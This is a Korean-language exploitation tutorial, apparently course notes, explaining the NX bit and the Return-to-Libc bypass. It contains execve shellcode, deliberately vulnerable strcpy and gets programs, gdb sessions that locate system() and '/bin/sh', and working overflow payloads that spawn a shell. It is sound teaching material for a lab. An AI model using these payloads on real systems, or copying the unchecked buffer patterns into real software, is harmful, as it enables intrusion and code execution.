# NX bit
* NX bit(No-eXecute bit) : 프로그램의 공격을 어렵게 하기 위해, 메모리에 쓰기 권한과 실행 권한을 동시에 부여하지 않는 것.
* 예시
``` C
//gcc -o example2_x example2.c -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -m32
//NX bit가 적용되어 있는 컴파일
//gcc -o example2_nx example2.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
//NX bit가 적용되어 있지 않은 컴파일
#include <stdio.h>
unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
int main(void){
  void (*shellcode)() = (void(*)())code;
  
  printf("Executing shellcode\n");
  shellcode();
}
```
  * NX bit가 적용되지 않은 example2_x의 메모리 맵
  ```
  $ gdb -q ./example2_x
  Reading symbols from ./example2_x...(no debugging symbols found)...done.
  (gdb) b main
  Breakpoint 1 at 0x8048411
  (gdb) r
  Starting program: ~/example2_x 
  Breakpoint 1, 0x08048411 in main ()
  (gdb) shell cat /proc/`pidof example2_x`/maps
  08048000-08049000 r-xp 00000000 08:01 147398                             ~/example2_x
  08049000-0804a000 r-xp 00000000 08:01 147398                             ~/example2_x
  0804a000-0804b000 rwxp 00001000 08:01 147398                             ~/example2_x 
  …
  fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
  (gdb) 
  ```
  
  스택과 데이터 영역 모두 rwx, 즉 읽기, 쓰기, 실행 권한을 가지고 있따.
  example2_x 바이너리를 실행했을 때 정상적으로 셸코드가 실행되어 셸이 실행된다.
  ```
  $ ./example2_x
  Executing shellcode
  $ id
  uid=1001(theori) gid=1001(theori) groups=1001(theori) 
  ```
  * NX bit가 적용된 example2_nx의 메모리 맵
  ```
  $ gdb -q ./example2_nx
  Reading symbols from ./example2_nx...(no debugging symbols found)...done.
  (gdb) b main
  Breakpoint 1 at 0x8048411
  (gdb) r
  Starting program: ~/example2_nx 
  Breakpoint 1, 0x08048411 in main ()
  (gdb) shell cat /proc/`pidof example2_nx`/maps
  08048000-08049000 r-xp 00000000 08:01 147400                             ~/example2_nx
  08049000-0804a000 r--p 00000000 08:01 147400                             ~/example2_nx
  0804a000-0804b000 rw-p 00001000 08:01 147400                             ~/example2_nx
  …
  fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
  (gdb) 
  ```
  스택과 데이터 영역 모두 rw, 즉 읽기, 쓰기 권한만 가지고 있다.
  example2_nx 바이너리를 실행했을 때는 데이터 영역에 실행권한이 없기 때문에 Segmentation Fault가 발생한 다.
  ```
  $ ./example2_nx
  Executing shellcode
  [1]    104735 segmentation fault (core dumped)  ./example2_nx
  $
  ```
NX bit가 설정되어 있을 경우에는 쓰기 권한과 실행 권한이 동시에 있는 메모리 영역이 존재하지 않는다. 그래서 실행 권한이 있는 영역에 존재하는 코드만 사용해야 한다.
C 언어에서 printf와 같은 라이브러리 함수가 사용될 때, 프로그램은 메모리에 로딩된 라이브러리 파일에서 호출된 함수의 주소를 찾아 실행한다. 그러므로 프로그램에서 호출된 함수 이외에 system과 같이 익스플로잇에 유용한 함수 코드들도 함꼐 로딩된다.
* 예제
``` C
// HelloWorld.c
// gcc -o HelloWorld HelloWorld.c -m32
#include <stdio.h>
int main(void){
  printf("Hello World!\n");
}
```
```
$ gdb -q ./HelloWorld
Reading symbols from ./HelloWorld...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x804840e
(gdb) r
Starting program: ~/HelloWorld 
Breakpoint 1, 0x0804840e in main ()
(gdb) info proc map
process 106678
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 ~/HelloWorld
	 0x8049000  0x804a000     0x1000        0x0 ~/HelloWorld
	 0x804a000  0x804b000     0x1000     0x1000 ~/HelloWorld
	0xf7e02000 0xf7e03000     0x1000        0x0 
	0xf7e03000 0xf7fb3000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so 
  //libc.so.6 라이브러리의 코드 영역이다. libc.so.6은 호환성을 위해 존재하는 libc-2.23.so의 심볼릭 링크 파일이다.
	0xf7fb3000 0xf7fb5000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fb5000 0xf7fb6000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fb6000 0xf7fb9000     0x3000        0x0 
	0xf7fd3000 0xf7fd4000     0x1000        0x0 
	0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
	0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
	0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
	0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
	0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) p printf
$1 = {<text variable, no debug info>} 0xf7e4c670 <printf>
(gdb) p scanf
$2 = {<text variable, no debug info>} 0xf7e5e370 <scanf>
(gdb) p exit
$3 = {<text variable, no debug info>} 0xf7e319d0 <exit>
(gdb) 
```
HelloWorld.c는 Hello World!를 출력하는 간단한 예제이다.
HelloWorld 프로그램의 0xf7e03000~0xf7fb3000 영역이 libc.so.6 라이브러리 코드 영역 주소이고, gdb 화면을 보면 프로그램에서 사용된 printf 함수 이외의 다른 함수들이 메모리에 존재한다는 것을 확인할 수 있다.
프로그램에 스택 버퍼 오버플로우 취약점이 존재할 때, 리턴 주소를 이와 같은 방법으로 알아낸 라이브러리 함수의 주소로 바꾸면 해당하는 함수를 호출할 수 있다.

# RTL
* Return To Libc(RTL) : 리턴 주소를 라이브러리 내에 존재하는 함수의 주소로 바꿔 NX bit을 우회하는 공격 기법이다.
libc.so.6 라이브버리에는 execve, execlp, execl, execvp, system.popen 등 프로그램을 실행할 수 있는 다양한 함수들이 존재한다. 이 중 system 함수는 인자를 하나만 받기 떄문에 익스플로잇 할 때 많이 사용된다.
system 함수의 인자는 실행할 셸 명령어 문자열의 주소이기 때무에, 만약 "/bin/sh" 문자열의 주소를 system 함수의 인자로 넘겨준 후 호출하면 /bin/sh 바이너리가 실행된다.
* 예제
``` C
//gcc -o example1_nx example1.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int vuln(char * src){
  
  char buf[32] = {};
  
  strcpy(buf, src);
  return 0;
}
int main(int argc, char * argv[], char * environ[]){
  if (argc < 2){
    exit(-1);
  }
  vuln(argv[1]);
  return 0;
}
```
system 함수를 호출하여 system("/bin/sh")를 실행하는 것이 목표이다.
```
(gdb) r `python -c 'print "A"*36+"BBBB"'`
Starting program: ~/example1_nx `python -c 'print "A"*36+"BBBB"'`
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info reg
eax            0x0	0
ecx            0xffffd770	-10384
edx            0xffffd520	-10976
ebx            0x0	0
esp            0xffffd524	0xffffd524
ebp            0x41414141	0x41414141
esi            0xf7fb5000	-134524928
edi            0xf7fb5000	-134524928
eip            0x42424242	0x42424242
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) x/4wx $esp-4
0xffffd520:	0x42424242	0xffffd700	0x00000000	0xf7e1b637
(gdb) 
```
buf 배열부터 vuln 함수의 리턴주소 위치까지 이전과 동일하게 36바이트이다.
실행결과 eip 레지스터가 0x42424242로 바뀌었고, ret을 하기 전의 스택 포인터인 esp-4 메모리에 0x42424242가 저장되어 있는 것을 볼 수 있다.
만약 인자가 3개인 함수 func(1, 2, 3)을 호출한다면, func+0 시점에서의 스택 메모리 상태는 다음과 같다.     
![image](https://user-images.githubusercontent.com/59531805/79416154-01f30500-7fea-11ea-998b-bd48912619a2.png)   
RTL에서, 리턴 주소에 호출할 함수의 주소를 덮어쓴 후 ret을 하면 eip 레지스터가 덮은 값이 되고, esp 레지스터는 리턴 주소의 위치+4가 된다.
위 스택 구조를 참고해 보았을 때, 함수 시작 부분에서의 인자의 위치는 esp+4가 되고, 호출된 함수의 리턴 주소가 저장된 위치는 esp+0이 된다.
system("/bin/sh")를 호출하는 익스플로잇 코드는 아래와 같다.
```
"A" * 36 + (system 함수 주소) + "BBBB" + ("/bin/sh" 주소)
```
BBBB 문자열은 system 함수가 종료되고 난 후 리턴할 주소인데, 단지 system("/bin/sh")를 실행하는 것이 목표이기 때문에 임의의 값으 적어도 무방하다.
```
$ gdb -q ./example1_nx
Reading symbols from ./example1_nx...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048479
(gdb) r aaaabbbb
Starting program: ~/example1_nx aaaabbbb
Breakpoint 1, 0x080484fb in main ()
(gdb) info proc map
process 110780
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 ~/example1_nx
	 0x8049000  0x804a000     0x1000        0x0 ~/example1_nx
	 0x804a000  0x804b000     0x1000     0x1000 ~/example1_nx
	0xf7e02000 0xf7e03000     0x1000        0x0 
	0xf7e03000 0xf7fb3000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fb3000 0xf7fb5000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fb5000 0xf7fb6000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
	0xf7fb6000 0xf7fb9000     0x3000        0x0 
	0xf7fd3000 0xf7fd4000     0x1000        0x0 
	0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
	0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
	0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
	0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
	0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e3dda0 <system>
(gdb) find 0xf7e03000, 0xf7fb3000, "/bin/sh"
0xf7f5ea0b
1 pattern found.
(gdb) x/s 0xf7f5ea0b
0xf7f5ea0b:	"/bin/sh"
(gdb) 
```
system("/bin/sh")를 호출하기 위해 알아야 하는 값은 system 함수의 주소와 /bin/sh 문자열의 주소이다.
main 함수에 breakpoint를 설정한 후, gdb의 print 명령어를 통해 system 주소를 찾고, find 명령어를 통해 libc.so.6 라이브러리에 존재하는 /bin/sh 주소를 찾았다.
system이나 popen 등의 셸 명령어 실행 함수들은 내부적으로 /bin/sh 문자열을 사용하기 때무에 라이브러리 메모리에서 /bin/sh 문자열을 찾을 수 있다.
system 함수와 "/bin/sh" 문자열의 주소를 이용해 실제 익스플로잇을 만들어 보면 아래와 같다.
```
"A"*36 + "\xa0\xdd\xe3\xf7" + "BBBB" + "\x0b\xea\xf5\xf7"
```
vuln 함수가 리턴하는 시점에 breakpont를 설정해 스택 메모리를 살펴보자.
```
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	sub    esp,0x20
   ...
   0x08048475 <+58>:	ret    
End of assembler dump.
(gdb) b *0x08048475
Breakpoint 1 at 0x8048475
(gdb) r `python -c 'print "A"*36+"\xa0\xdd\xe3\xf7"+"BBBB"+"\x0b\xea\xf5\xf7"'`
Starting program: ~/example1_nx `python -c 'print "A"*36+"\xa0\xdd\xe3\xf7"+"BBBB"+"\x0b\xea\xf5\xf7"'`
Breakpoint 1, 0x08048475 in vuln ()
(gdb) x/i $eip
=> 0x8048475 <vuln+58>:	ret    
(gdb) x/3wx $esp
0xffffd5b0:	0xf7e3dda0	0x42424242	0xf7f5ea0b
```
system 함수의 주소(0xf7e3dda0)와 "/bin/sh" 문자열의 주소(0xf7f5ea0b)가 스택에 저장되어 있는 것을 확인해 볼 수 있다. 이를 실제 바이너리의 argv[1]에 넣어 실행해보면 정상적으로 셸이 실행되는 것을 확인할 수 있다.
```
$ ./example1_nx `python -c 'print "A"*36 + "\xa0\xdd\xe3\xf7" + "BBBB" + "\x0b\xea\xf5\xf7"'`
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
$
```
* 실습
```
// system function address : 0xf7e3dda0
// "id" string address : 0xf7f5e988
#include <stdio.h>
int main(void){
    
    char buf[32];
    
    gets(buf);
    return 0;
}
```
payload = "A"*(32+4)+"\xa0\xdd\xe3\xf7"+"B"*4+"\x88\xe9\xf5\xf7"

+) NX bit가 설정되어 있는지 확인하는 바법
- readelf 사용
  ```
  $ readelf -a ./example1 | grep STACK
    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
  $ readelf -a ./example1_nx | grep STACK
    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  ```
- 메모리 맵 이용
  ```
  $ gdb -q ./example1
  Reading symbols from ./example1...(no debugging symbols found)...done.
  (gdb) b main
  Breakpoint 1 at 0x8048479
  (gdb) r
  Starting program: ~/example1 
  Breakpoint 1, 0x08048479 in main ()
  (gdb) shell cat /proc/`pidof example1`/maps | grep -i stack
  fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
  (gdb) 
  ```
  
